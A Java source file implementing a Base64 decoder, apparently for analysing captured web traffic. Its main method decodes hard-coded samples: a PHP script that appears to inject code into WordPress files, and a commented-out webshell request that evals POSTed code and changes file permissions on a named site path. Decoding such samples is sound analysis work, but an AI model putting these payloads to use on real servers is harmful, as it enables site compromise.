package my.udf;

import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.LinkedList;
import java.util.List;

public class Base64Decode {
    List<byte[]> decode(byte[] input) {
        List<byte[]> result = new LinkedList<byte[]>();
        return result;
    }
    
    public static byte alpha(byte c) {
    	if (Character.isUpperCase(c)) {
    		return (byte) (c - 'A');
    	} else if (Character.isLowerCase(c)) {
    		return (byte) (c - 'a' + 26);
    	} else if (Character.isDigit(c)) {
    		return (byte) (c - '0' + 52);
    	}  else if (c == '+') {
    		return (byte) (62);
    	}  else if (c == '/') {
    		return (byte) (63);
    	}  else if (c == '=') {
    		return (byte) (0xFE);
    	} else {
    		return (byte)0xFF;
    	}
    }

    
    public static boolean is_alpha(byte c) {
    	return Character.isUpperCase(c) 
    			|| Character.isLowerCase(c)
    			|| Character.isDigit(c) 
    			|| c == '+'
    			|| c == '/'
    			|| c == '=';
    }
    
    public static byte[] longest_sub_base64(byte[] input) {
    	if (input.length == 0) {
    		return input;
    	}
    	int max = 0;
    	int[] result = new int[input.length];
    	result[0] = is_alpha(input[0]) ? 1 : 0;
    	for (int i = 1; i < input.length; ++i) {
        	result[i] = is_alpha(input[i]) ? result[i - 1] + 1 : 0;
        	if (result[i] > result[max]) {
        		max = i;
        	}
    	}
    	
    	return Arrays.copyOfRange(input, max - result[max] + 1, max + 1);
    }
    
    public static byte[] decode_base64(byte[] input) {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        int i = 0;
        int c;
        for (i = 0; i < input.length; i += 4) {
        	if (i + 1 >= input.length
        			|| alpha(input[i]) == (byte)0xff 
        			|| alpha(input[i + 1]) == (byte)0xff) {
        		break;
        	}
        	c = (alpha(input[i]) & 0b111111) << 2;
        	c |= (alpha(input[i + 1]) & 0b110000) >> 4;
        	output.write((byte)c);
        	if (i + 2 >= input.length || alpha(input[i + 2]) == (byte)0xfe) {
            	c = (alpha(input[i + 1]) & 0b001111) << 4;
            	output.write((byte)c);
        		break;
        	} else if (alpha(input[i + 2]) == (byte)0xff) {
            	break;
            }
        	c = (alpha(input[i + 1]) & 0b001111) << 4;
        	c |= (alpha(input[i + 2]) & 0b111100) >> 2;
        	output.write((byte)c);
        	if (i + 3 >= input.length || alpha(input[i + 3]) == (byte)0xfe) {
            	c = (alpha(input[i + 2]) & 0b000011) << 6;
            	output.write((byte)c);
        		break;
        	} else if (i + 3 >= input.length || alpha(input[i + 3]) == (byte)0xff) {
        		break;
        	}
        	c = (alpha(input[i + 2]) & 0b000011) << 6;
        	c |= (alpha(input[i + 3]) & 0b111111);
        	output.write((byte)c);
        }
        return output.toByteArray();
    }
    

	public static void main(String[] args) {
		System.out.println(new String(decode_base64("ZWNobyAibWFya2VyOjRiM2RiMmFkYTI4OGVmMWNkNzdjZGVhN2U3NmZmYzZmXG4iOyANCg0KJGRlcHRoID0gMjsNCg0KJGJhc2VfZGlyID0gZGlybmFtZShfX0ZJTEVfXyk7DQpmb3IgKCRpID0gMDsgJGkgPCAkZGVwdGg7ICRpKyspIHsNCiAgICAkZCA9IGRpcm5hbWUoJGJhc2VfZGlyKTsNCiAgICAkdG1wID0gZ2xvYigkZCAuICIvKiIsIEdMT0JfT05MWURJUik7DQogICAgaWYoY291bnQoJHRtcCk%2BMCkNCiAgICAgICAgJGJhc2VfZGlyID0gJGQ7DQogICAgZWxzZSB7DQogICAgICAgIGVjaG8oImNhbnQgcmVhZDogIi4kZC4iXG4iKTsNCiAgICB9DQp9DQoNCiR0ZW1wbGF0ZXNfYXJyYXkgPSAKYXJyYXkoCiAgICAwPT5hcnJheSgKICAgICAgICAiaW5qZWN0Ij0%2BJ0NtWjFibU4wYVc5dUlHMTVYM1JwYldVb0pHUnBjaWtnZXdvZ0lDQWdabTl5WldGamFDQW9aMnh2WWlna1pHbHlJQzRnSnk5M2NDMHFMbkJvY0NjcElHRnpJQ1JtS1NCN0NpQWdJQ0FnSUNBZ0pIUnBiV1Z6VzEwZ1BTQm1hV3hsYlhScGJXVW9KR1lwT3dvZ0lDQWdmUW9nSUNBZ0pHMWhlQ0E5SURFN0NpQWdJQ0JtYjNJZ0tDUnBJRDBnTURzZ0pHa2dQQ0JqYjNWdWRDZ2tkR2x0WlhNcElDMGdNVHNnSkdrckt5a2dld29nSUNBZ0lDQWdJQ1JySUQwZ01Uc0tJQ0FnSUNBZ0lDQm1iM0lnS0NScUlEMGdKR2tnS3lBeE95QWthaUE4SUdOdmRXNTBLQ1IwYVcxbGN5azdJQ1JxS3lzcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnYVdZZ0tDUjBhVzFsYzFza2FWMGdQVDBnSkhScGJXVnpXeVJxWFNrZ".getBytes())));
//		System.out.println(new String(longest_sub_base64("cmd=%40eval%2F%2A%CE%D2%C8%A5%C4%E3%C2%EE%C1%CB%B8%F4%B1%DA%2A%2F%01%28%24%7B%27%5FP%27.%27OST%27%7D%5Bz9%5D%2F%2A%CE%D2%C8%A5%C4%E3%C2%EE%C1%CB%B8%F4%B1%DA%2A%2F%01%28%24%7B%27%5FPOS%27.%27T%27%7D%5Bz0%5D%29%29%3B&z0=MjY3NjMyO0Bpbmlfc2V0KCJkaXNwbGF5X2Vycm9ycyIsIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7QHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTtlY2hvKCItPnwiKTs7ZnVuY3Rpb24gc2V0X3dyaXRlYWJsZSgkZmlsZV9uYW1lKXtpZihAY2htb2QoJGZpbGVfbmFtZSxiYXNlX2NvbnZlcnQoYmFzZTY0X2RlY29kZSgkX1BPU1RbIngyIl0pLDgsMTApKSl7ZWNobyAiMSI7fWVsc2V7ZWNobyAiLTEiO319c2V0X3dyaXRlYWJsZShiYXNlNjRfZGVjb2RlKCRfUE9TVFsieDEiXSkpO2VjaG8oInw8LSIpOztkaWUoKTs%3D&x1=RDovd2Vic2l0ZXMveGluc2p6LmNvbS9wdWJsaWNfaHRtbC9uZXdzLzA0MDMxNzA1Lmh0bWw%3D&x2=MDY2Ng%3D%3D&z9=BaSE64%5FdEcOdE".getBytes())));
	}
}